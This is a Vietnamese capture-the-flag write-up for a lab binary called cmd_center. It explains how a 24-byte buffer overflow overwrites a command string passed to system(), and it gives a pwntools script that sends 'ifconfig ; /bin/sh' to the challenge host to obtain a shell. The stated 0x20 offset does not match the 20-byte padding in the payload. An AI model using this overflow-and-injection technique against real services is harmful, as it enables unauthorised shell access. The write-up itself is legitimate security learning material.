* cmd_center.c
  ```c
  #include <stdlib.h>
  #include <stdio.h>
  #include <string.h>
  #include <unistd.h>

  void init() {
  	setvbuf(stdin, 0, 2, 0);
  	setvbuf(stdout, 0, 2, 0);
  }

  int main()
  {

  	char cmd_ip[256] = "ifconfig";
  	int dummy;
  	char center_name[24];

	  init();

  	printf("Center name: ");
  	read(0, center_name, 100);


  	if( !strncmp(cmd_ip, "ifconfig", 8)) {
	  	system(cmd_ip);
	  }

	  else {
		  printf("Something is wrong!\n");
	  }
	  exit(0);
  }
  ```

* Mảng **center_name** được khai báo 24bytes nhưng được nhập vào từ hàm `read()` tối đa 100bytes nên ta có lỗi buffer overflow

* Bên dưới hàm strncmp so sánh 8bytes đầu của mảng **cmd_ip** với chuỗi "ifconfig" nếu đúng thì chương trình sẽ thực thi hàm **system(cmd_ip)** bên dưới

* Hàm **system()**
  * ```c
    int system(const char *command);
    ```
    * `command`: Là một chuỗi ký tự chứa câu lệnh mà bạn muốn hệ điều hành thực thi.
    * **Cơ chế hoạt động**:
      * Gọi hàm `fork()` để tạo ra một tiến trình con.
      * Tiến trình con này sẽ gọi hàm execl() để khởi chạy **shell** ((Shell mặc định của hệ thống, thường là /bin/sh).
      * Truyền chuỗi command vào cho /bin/sh thực thi: /bin/sh -c "command".
* Ta có thể truyền vào chuỗi các lệnh làm tham số của **system()** để hàm **shell** thực hiện chuỗi lệnh đó. 
* Để chiếm được hệ thống thì ta phải để **shell** thực hiện lệnh `/bin/sh`.
* Như vậy trong bài này nếu ta overwrite được **cmd_ip** với 8byte đầu `"ifconfig"` và theo sau là lệnh `"/bin/sh"` và ta cần xâu chuỗi 2 lệnh đó, ta dùng `";"`.

*  <img width="613" height="455" alt="image" src="https://github.com/user-attachments/assets/fb124e18-e540-4a7b-b81c-1b3080a567b8" />

	Ta thấy được từ địa chỉ bắt đầu của **center_name** đến địa chỉ mảng **cmd_ip** đang chữa chuỗi "ifconfig" là **0x20** byte, ta đi exploit
* ```python
  #!/usr/bin/python3

  p=remote('host3.dreamhack.games', 23902)

  payload = b'a'*20 + b'ifconfig ; /bin/sh'

  p.sendafter(b'name: ', payload)

  p.interactive()
  ```
  
* <img width="553" height="182" alt="image" src="https://github.com/user-attachments/assets/59f6abef-93e0-4c64-bc48-535806cc018d" />

   


  
